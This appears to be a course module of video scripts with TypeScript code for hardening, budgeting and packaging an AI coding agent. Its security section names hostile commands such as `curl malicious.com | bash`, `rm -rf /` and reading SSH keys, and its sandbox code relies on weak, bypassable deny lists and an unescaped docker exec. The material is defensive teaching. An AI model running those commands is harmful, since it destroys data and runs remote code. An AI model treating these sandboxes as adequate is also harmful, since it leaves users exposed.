# Module 7: Production Considerations

**Duration:** 45 minutes (5 videos)
**Goal:** Make your agent safe, efficient, and user-friendly

---

## 7.1 Security and Sandboxing (12 min)

### Video Script

**[INTRO - 0:00-0:30]**

"Your AI agent has shell access and can modify files. This is powerful — and dangerous. Let's make it safe."

---

**[THE RISKS - 0:30-2:00]**

"What could go wrong?

1. **File system attacks**: Reading ~/.ssh/id_rsa, writing to /etc/passwd
2. **Command injection**: `rm -rf /`, `curl malicious.com | bash`
3. **Data exfiltration**: Sending code to external servers
4. **Resource exhaustion**: Infinite loops, filling disk
5. **Privilege escalation**: sudo, changing permissions

Never trust LLM output for anything security-critical."

---

**[PATH SANDBOXING - 2:00-5:00]**

```typescript
export class SecureFileSystem {
  private allowedPaths: string[];
  private deniedPatterns: RegExp[];
  
  constructor(projectRoot: string) {
    this.allowedPaths = [
      path.resolve(projectRoot),
      // Add other allowed paths
    ];
    
    this.deniedPatterns = [
      /\.env/,
      /\.ssh/,
      /\.git\/config/,
      /node_modules/,
      /password/i,
      /secret/i,
      /credential/i,
    ];
  }
  
  isPathAllowed(filePath: string): boolean {
    const resolved = path.resolve(filePath);
    
    // Must be under allowed path
    const underAllowed = this.allowedPaths.some(allowed => 
      resolved.startsWith(allowed)
    );
    if (!underAllowed) return false;
    
    // Must not match denied patterns
    const matchesDenied = this.deniedPatterns.some(pattern =>
      pattern.test(resolved)
    );
    if (matchesDenied) return false;
    
    return true;
  }
  
  async readFile(filePath: string): Promise<string> {
    if (!this.isPathAllowed(filePath)) {
      throw new Error(`Access denied: ${filePath}`);
    }
    return fs.readFile(filePath, 'utf-8');
  }
  
  async writeFile(filePath: string, content: string): Promise<void> {
    if (!this.isPathAllowed(filePath)) {
      throw new Error(`Access denied: ${filePath}`);
    }
    
    // Don't allow writing executable files
    if (content.startsWith('#!')) {
      throw new Error('Cannot write executable files');
    }
    
    await fs.writeFile(filePath, content);
  }
}
```

---

**[COMMAND SANDBOXING - 5:00-9:00]**

```typescript
export class SecureCommandRunner {
  private allowedCommands: Set<string>;
  private deniedArgs: RegExp[];
  private timeout: number;
  
  constructor() {
    this.allowedCommands = new Set([
      'npm', 'npx', 'node',
      'git', 'cat', 'ls', 'find', 'grep',
      'tsc', 'eslint', 'prettier',
      'echo', 'pwd'
    ]);
    
    this.deniedArgs = [
      /rm\s+-rf/,
      /sudo/,
      /chmod/,
      /chown/,
      /curl.*\|.*sh/,
      /wget.*\|.*sh/,
      /eval\s*\(/,
      />>\s*\/etc/,
      /\/dev\/sd/,
    ];
    
    this.timeout = 30000; // 30 seconds
  }
  
  async run(command: string, args: string[]): Promise<CommandResult> {
    // Check command allowlist
    if (!this.allowedCommands.has(command)) {
      throw new Error(`Command not allowed: ${command}`);
    }
    
    // Check for dangerous args
    const fullCommand = `${command} ${args.join(' ')}`;
    for (const pattern of this.deniedArgs) {
      if (pattern.test(fullCommand)) {
        throw new Error(`Dangerous argument pattern detected`);
      }
    }
    
    // Run with timeout and resource limits
    return new Promise((resolve, reject) => {
      const proc = spawn(command, args, {
        timeout: this.timeout,
        stdio: ['pipe', 'pipe', 'pipe'],
        shell: false, // Prevent shell injection
        env: {
          ...process.env,
          PATH: '/usr/local/bin:/usr/bin:/bin', // Restricted PATH
        }
      });
      
      // Limit output size
      let stdout = '';
      let stderr = '';
      const maxOutput = 100000;
      
      proc.stdout.on('data', (data) => {
        if (stdout.length < maxOutput) {
          stdout += data.toString().slice(0, maxOutput - stdout.length);
        }
      });
      
      proc.stderr.on('data', (data) => {
        if (stderr.length < maxOutput) {
          stderr += data.toString().slice(0, maxOutput - stderr.length);
        }
      });
      
      proc.on('close', (code) => {
        resolve({ stdout, stderr, exitCode: code ?? -1 });
      });
      
      proc.on('error', reject);
    });
  }
}
```

---

**[DOCKER SANDBOXING - 9:00-12:00]**

```typescript
export class DockerSandbox {
  private containerName: string;
  
  async start(projectRoot: string): Promise<void> {
    this.containerName = `agent-sandbox-${Date.now()}`;
    
    await execAsync(`docker run -d \
      --name ${this.containerName} \
      --memory=1g \
      --cpus=1 \
      --network=none \
      --read-only \
      --tmpfs /tmp \
      -v ${projectRoot}:/workspace:rw \
      -w /workspace \
      node:20-slim \
      tail -f /dev/null`);
  }
  
  async exec(command: string): Promise<string> {
    const { stdout } = await execAsync(
      `docker exec ${this.containerName} ${command}`,
      { timeout: 30000 }
    );
    return stdout;
  }
  
  async stop(): Promise<void> {
    await execAsync(`docker stop ${this.containerName}`);
    await execAsync(`docker rm ${this.containerName}`);
  }
}
```

---

## 7.2 Cost Optimization (10 min)

### Video Script

**[INTRO - 0:00-0:30]**

"AI API calls cost money. Let's optimize."

---

**[TOKEN BUDGETING - 0:30-4:00]**

```typescript
export class TokenBudget {
  private maxTokensPerTask: number;
  private usedTokens: number = 0;
  private costPerInputToken: number;
  private costPerOutputToken: number;
  
  constructor(options: {
    maxTokensPerTask?: number;
    model?: string;
  }) {
    this.maxTokensPerTask = options.maxTokensPerTask ?? 100000;
    
    // Costs per 1K tokens (as of 2024)
    const costs: Record<string, { input: number; output: number }> = {
      'gpt-4-turbo': { input: 0.01, output: 0.03 },
      'gpt-4o': { input: 0.005, output: 0.015 },
      'gpt-4o-mini': { input: 0.00015, output: 0.0006 },
      'claude-3-5-sonnet': { input: 0.003, output: 0.015 },
    };
    
    const model = options.model ?? 'gpt-4-turbo';
    this.costPerInputToken = (costs[model]?.input ?? 0.01) / 1000;
    this.costPerOutputToken = (costs[model]?.output ?? 0.03) / 1000;
  }
  
  canAfford(estimatedTokens: number): boolean {
    return this.usedTokens + estimatedTokens <= this.maxTokensPerTask;
  }
  
  record(inputTokens: number, outputTokens: number): void {
    this.usedTokens += inputTokens + outputTokens;
  }
  
  getCost(): number {
    // Rough estimate (would need actual input/output split)
    return this.usedTokens * (this.costPerInputToken + this.costPerOutputToken) / 2;
  }
  
  getRemainingBudget(): number {
    return this.maxTokensPerTask - this.usedTokens;
  }
}
```

---

**[PROMPT CACHING - 4:00-7:00]**

```typescript
// Anthropic supports prompt caching
export class CachedLLMClient {
  private cache = new Map<string, { response: string; timestamp: number }>();
  private cacheMaxAge = 60 * 60 * 1000; // 1 hour
  
  async chat(
    messages: Message[],
    options?: { useCache?: boolean }
  ): Promise<string> {
    if (options?.useCache) {
      const cacheKey = this.getCacheKey(messages);
      const cached = this.cache.get(cacheKey);
      
      if (cached && Date.now() - cached.timestamp < this.cacheMaxAge) {
        return cached.response;
      }
    }
    
    const response = await this.llm.chat(messages);
    
    if (options?.useCache) {
      const cacheKey = this.getCacheKey(messages);
      this.cache.set(cacheKey, {
        response,
        timestamp: Date.now()
      });
    }
    
    return response;
  }
  
  private getCacheKey(messages: Message[]): string {
    return crypto
      .createHash('sha256')
      .update(JSON.stringify(messages))
      .digest('hex');
  }
}

// For Anthropic's native caching
async function chatWithAnthropicCache(
  systemPrompt: string,
  userMessage: string
): Promise<string> {
  const response = await anthropic.messages.create({
    model: 'claude-3-5-sonnet-20241022',
    max_tokens: 4096,
    system: [
      {
        type: 'text',
        text: systemPrompt,
        cache_control: { type: 'ephemeral' } // Cache this!
      }
    ],
    messages: [{ role: 'user', content: userMessage }]
  });
  
  return response.content[0].text;
}
```

---

**[MODEL ROUTING - 7:00-10:00]**

```typescript
export class SmartModelRouter {
  async selectModel(task: string, context: string): Promise<string> {
    const tokenEstimate = estimateTokens(task + context);
    const complexity = await this.assessComplexity(task);
    
    // Simple tasks → cheap model
    if (complexity === 'simple' && tokenEstimate < 2000) {
      return 'gpt-4o-mini';
    }
    
    // Medium tasks → balanced model
    if (complexity === 'medium' || tokenEstimate < 10000) {
      return 'gpt-4o';
    }
    
    // Complex tasks → best model
    return 'gpt-4-turbo';
  }
  
  private async assessComplexity(task: string): Promise<'simple' | 'medium' | 'complex'> {
    const simplePatterns = [
      /add a comment/i,
      /rename/i,
      /fix typo/i,
      /format/i,
    ];
    
    const complexPatterns = [
      /refactor/i,
      /implement/i,
      /design/i,
      /architect/i,
      /multiple files/i,
    ];
    
    if (simplePatterns.some(p => p.test(task))) return 'simple';
    if (complexPatterns.some(p => p.test(task))) return 'complex';
    return 'medium';
  }
}
```

---

## 7.3 Streaming and UX (10 min)

### Video Script

**[INTRO - 0:00-0:30]**

"Good UX makes the difference between a tool people love and one they abandon."

---

**[STREAMING RESPONSES - 0:30-4:00]**

```typescript
export async function streamResponse(
  messages: Message[],
  onToken: (token: string) => void,
  onToolCall?: (name: string, args: any) => void
): Promise<void> {
  const stream = await openai.chat.completions.create({
    model: 'gpt-4-turbo-preview',
    messages,
    tools: toolDefinitions,
    stream: true
  });
  
  let currentToolCall: { name: string; args: string } | null = null;
  
  for await (const chunk of stream) {
    const delta = chunk.choices[0]?.delta;
    
    // Stream content
    if (delta?.content) {
      onToken(delta.content);
    }
    
    // Accumulate tool calls
    if (delta?.tool_calls) {
      for (const tc of delta.tool_calls) {
        if (tc.function?.name) {
          currentToolCall = { name: tc.function.name, args: '' };
        }
        if (tc.function?.arguments && currentToolCall) {
          currentToolCall.args += tc.function.arguments;
        }
      }
    }
  }
  
  // Report tool call when complete
  if (currentToolCall && onToolCall) {
    onToolCall(currentToolCall.name, JSON.parse(currentToolCall.args));
  }
}
```

---

**[PROGRESS INDICATORS - 4:00-7:00]**

```typescript
import ora from 'ora';
import chalk from 'chalk';

export class ProgressUI {
  private spinner = ora();
  
  thinking(): void {
    this.spinner.start(chalk.blue('Thinking...'));
  }
  
  usingTool(name: string, args: any): void {
    this.spinner.stop();
    console.log(chalk.yellow(`→ ${name}`), chalk.gray(JSON.stringify(args).slice(0, 60)));
    this.spinner.start(chalk.blue('Processing...'));
  }
  
  toolResult(name: string, success: boolean): void {
    this.spinner.stop();
    const icon = success ? chalk.green('✓') : chalk.red('✗');
    console.log(`${icon} ${name}`);
    this.spinner.start(chalk.blue('Continuing...'));
  }
  
  done(): void {
    this.spinner.stop();
    console.log(chalk.green('✓ Complete'));
  }
  
  error(message: string): void {
    this.spinner.stop();
    console.log(chalk.red('✗ Error:'), message);
  }
}
```

---

**[INLINE DIFF PREVIEW - 7:00-10:00]**

```typescript
export function printDiffPreview(
  oldContent: string,
  newContent: string,
  filePath: string
): void {
  console.log(chalk.bold(`\n${filePath}`));
  console.log(chalk.gray('─'.repeat(50)));
  
  const oldLines = oldContent.split('\n');
  const newLines = newContent.split('\n');
  
  const diff = diffLines(oldContent, newContent);
  
  let lineNum = 1;
  for (const part of diff) {
    const lines = part.value.split('\n').filter(l => l !== '');
    
    for (const line of lines) {
      if (part.added) {
        console.log(chalk.green(`+ ${line}`));
      } else if (part.removed) {
        console.log(chalk.red(`- ${line}`));
      } else {
        console.log(chalk.gray(`  ${line}`));
      }
      lineNum++;
    }
  }
  
  console.log(chalk.gray('─'.repeat(50)));
}
```

---

## 7.4 Building a CLI Interface (8 min)

### Video Script

**[INTRO - 0:00-0:30]**

"A good CLI makes your agent easy to use."

---

**[CLI STRUCTURE - 0:30-4:00]**

```typescript
#!/usr/bin/env node
import { Command } from 'commander';
import { CodingAgent } from './agent';
import { ProgressUI } from './ui';

const program = new Command();

program
  .name('ai-dev')
  .description('AI-powered coding assistant')
  .version('1.0.0');

program
  .command('chat')
  .description('Start interactive chat mode')
  .option('-m, --model <model>', 'LLM model to use', 'gpt-4-turbo')
  .option('-v, --verbose', 'Show detailed output')
  .action(async (options) => {
    const agent = new CodingAgent({
      projectRoot: process.cwd(),
      model: options.model,
      verbose: options.verbose
    });
    
    await agent.initialize();
    await interactiveChat(agent);
  });

program
  .command('do <task>')
  .description('Execute a one-shot task')
  .option('-y, --yes', 'Auto-confirm changes')
  .action(async (task, options) => {
    const agent = new CodingAgent({ projectRoot: process.cwd() });
    await agent.initialize();
    
    const result = await agent.execute(task);
    console.log(result);
    
    if (!options.yes) {
      const confirm = await prompt('Apply these changes? (y/n)');
      if (confirm !== 'y') {
        await agent.rollback();
      }
    }
  });

program
  .command('index')
  .description('Index the codebase for faster searches')
  .action(async () => {
    const index = new CodeIndex();
    await index.index(process.cwd());
    await index.save('.ai-index.json');
    console.log('Index saved to .ai-index.json');
  });

program.parse();
```

---

**[INTERACTIVE MODE - 4:00-8:00]**

```typescript
import * as readline from 'readline';

async function interactiveChat(agent: CodingAgent): Promise<void> {
  const rl = readline.createInterface({
    input: process.stdin,
    output: process.stdout
  });
  
  console.log(chalk.blue('AI Coding Agent'));
  console.log(chalk.gray('Type your requests. Use /help for commands.\n'));
  
  const prompt = () => {
    rl.question(chalk.green('> '), async (input) => {
      input = input.trim();
      
      // Handle commands
      if (input.startsWith('/')) {
        await handleCommand(input, agent);
        prompt();
        return;
      }
      
      // Handle task
      if (input) {
        try {
          const result = await agent.execute(input);
          console.log('\n' + result + '\n');
        } catch (error: any) {
          console.log(chalk.red('Error:'), error.message);
        }
      }
      
      prompt();
    });
  };
  
  prompt();
}

async function handleCommand(input: string, agent: CodingAgent): Promise<void> {
  const [cmd, ...args] = input.slice(1).split(' ');
  
  switch (cmd) {
    case 'help':
      console.log(`
Commands:
  /help     - Show this help
  /undo     - Undo last change
  /status   - Show modified files
  /diff     - Show all changes
  /commit   - Commit changes
  /clear    - Clear conversation
  /exit     - Exit
`);
      break;
      
    case 'undo':
      await agent.rollback(parseInt(args[0]) || 1);
      console.log('Rolled back changes');
      break;
      
    case 'diff':
      const diff = await agent.getDiff();
      console.log(diff);
      break;
      
    case 'exit':
      process.exit(0);
      
    default:
      console.log('Unknown command. Type /help for help.');
  }
}
```

---

## 7.5 IDE Extension Basics (5 min)

### Video Script

**[INTRO - 0:00-0:30]**

"Want your agent in VSCode? Here's how to get started."

---

**[EXTENSION STRUCTURE - 0:30-3:00]**

```typescript
// extension.ts
import * as vscode from 'vscode';
import { CodingAgent } from './agent';

export function activate(context: vscode.ExtensionContext) {
  const agent = new CodingAgent({
    projectRoot: vscode.workspace.rootPath ?? '.'
  });
  
  // Register command
  const disposable = vscode.commands.registerCommand(
    'ai-agent.ask',
    async () => {
      const input = await vscode.window.showInputBox({
        prompt: 'What would you like me to do?'
      });
      
      if (!input) return;
      
      await vscode.window.withProgress({
        location: vscode.ProgressLocation.Notification,
        title: 'AI Agent working...',
        cancellable: true
      }, async (progress, token) => {
        const result = await agent.execute(input);
        vscode.window.showInformationMessage(result);
      });
    }
  );
  
  context.subscriptions.push(disposable);
}
```

---

**[INLINE ACTIONS - 3:00-5:00]**

```typescript
// Code action provider
class AICodeActionProvider implements vscode.CodeActionProvider {
  provideCodeActions(
    document: vscode.TextDocument,
    range: vscode.Range
  ): vscode.CodeAction[] {
    const selectedText = document.getText(range);
    if (!selectedText) return [];
    
    const actions = [
      this.createAction('Explain this code', 'explain', selectedText),
      this.createAction('Refactor this code', 'refactor', selectedText),
      this.createAction('Add tests for this', 'test', selectedText),
    ];
    
    return actions;
  }
  
  private createAction(title: string, action: string, code: string): vscode.CodeAction {
    const codeAction = new vscode.CodeAction(title, vscode.CodeActionKind.QuickFix);
    codeAction.command = {
      command: 'ai-agent.action',
      title,
      arguments: [action, code]
    };
    return codeAction;
  }
}
```

---

## Module 7 Summary

You now understand:
1. Security and sandboxing essentials
2. Cost optimization strategies
3. Streaming and UX best practices
4. CLI interface design
5. IDE extension basics

**Your agent is production-ready!**

Next: Module 8 — Final Project
